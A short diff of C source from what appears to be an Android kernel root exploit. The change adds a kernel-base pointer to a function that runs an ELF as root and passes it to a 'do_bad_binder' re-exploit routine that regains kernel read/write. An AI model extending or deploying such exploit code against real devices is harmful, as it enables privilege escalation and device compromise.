@@ -385,6 +385,7 @@ static int32_t exec_elf_as_root(uint64_t pThreadInfo, uint64_t pFile, int32_t iI
     int32_t iFd = -1;
     uint64_t ulAddrLimit = USER_DS;
     uint64_t pTaskStruct = 0;
+    uint64_t pKernelBase = 0;
     uint64_t pFileOps = 0;
     uint64_t pFakeFileOps = 0;
     uint64_t ulReplaceVal = 0;
@@ -420,7 +421,7 @@ static int32_t exec_elf_as_root(uint64_t pThreadInfo, uint64_t pFile, int32_t iI
 
     printf("[!] rexploiting to regain kernel r/w\n");
 
-    if(0 != do_bad_binder(&pTaskStruct, &pThreadInfo))
+    if(0 != do_bad_binder(&pTaskStruct, &pThreadInfo, &pKernelBase))
     {
         printf("[-] failed to reexploit!\n");
         goto done;
